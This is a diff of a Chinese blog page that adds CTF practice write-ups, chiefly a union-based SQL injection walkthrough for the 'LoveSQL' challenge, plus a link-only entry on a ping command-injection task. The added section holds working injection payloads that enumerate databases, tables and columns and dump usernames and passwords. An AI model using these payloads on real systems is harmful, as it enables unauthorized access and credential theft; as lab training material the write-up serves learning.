@@ -587,21 +587,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-01-17
+                    2022-01-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.7k
+                    3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    12 分
                 </div>
                 
 
@@ -901,8 +901,31 @@ cmd1 <span class="token operator">||</span> cmd2               <span class="toke
 
 <p>页面返回flag.php的源码，解密后看到flag：<code>flag{b3f2f2c1-5e4f-4b48-8bc5-1cf85ef574b2}</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201171145473.png"></p>
+<h2 id="9-极客大挑战-2019-LoveSQL"><a href="#9-极客大挑战-2019-LoveSQL" class="headerlink" title="9.[极客大挑战 2019]LoveSQL"></a>9.[极客大挑战 2019]LoveSQL</h2><p>考察联合注入:</p>
+<p>首先在username处输入<code>1'</code>,password输个1，发现语法报错，即存在sql注入。接着先查看一下字段数：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' order by 4 #   报错
+1' order by 3 #   无报错，说明三个字段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后试下联合查询爆破所有数据库：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(schema_name) from information_schema.schemata #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050615.png"></p>
+<p>看到有geek，大概率就是他了，接下来查看表名：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050616.png"></p>
+<p>接着试试查看l0ve1ysq1表里的列名：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu/202201191050617.png"></p>
+<p>最后就可以直接拿数据了：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到flag{fbee60d0-759c-4012-a59b-bc0509fa5431}。</p>
+<h2 id="10-GXYCTF2019-Ping-Ping-Ping"><a href="#10-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="10.[GXYCTF2019]Ping Ping Ping"></a>10.[GXYCTF2019]Ping Ping Ping</h2><p>又是一道命令执行漏洞的题目，不过存在了很多过滤，自己试了多种方法也不得行，看了一个师傅的博客学到了,tql，直接贴链接吧：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_39190897/article/details/116247765?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164256111016780274119167%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164256111016780274119167&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-116247765.pc_search_result_control_group&amp;utm_term=ping%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187</a></p>
 <hr>
-<p>最后吐槽一下自己，看了warmup题，看好长时间不会，哎，还是太菜了，慢慢学吧~</p>
+<p>刷了十道题咧，哎，还是太菜了，不果慢慢有节奏了，慢慢学吧~</p>
 <p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948723.png"></p>
 
                 
@@ -1767,7 +1790,7 @@ new Valine({
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7.9k</span>&nbsp;字
+                class="white-color">8.2k</span>&nbsp;字
             
             
             
